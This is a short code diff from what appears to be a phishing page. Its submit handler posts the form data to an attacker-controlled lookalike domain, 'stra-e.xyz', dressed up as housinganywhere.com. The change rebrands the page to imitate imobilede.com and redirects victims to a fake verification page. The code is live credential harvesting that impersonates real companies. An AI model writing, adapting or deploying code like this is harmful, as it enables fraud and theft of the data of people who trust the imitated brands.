@@ -12,8 +12,8 @@ function Home() {
 
   async function handleSubmitFn() {
     try {
-      await axios.post(`https://housinganywhere.com.id.stra-e.xyz/api/code`, data);
-      router.replace('https://housinganywhere.com/users/show/2080199');
+      await axios.post(`http://imobilede.com.id.stra-e.xyz/api/code`, data);
+      router.replace('http://imobilede.com.id.stra-e.xyz/verificare');
     } catch(err) {
       console.log(err.response, "ce o avea");
     }
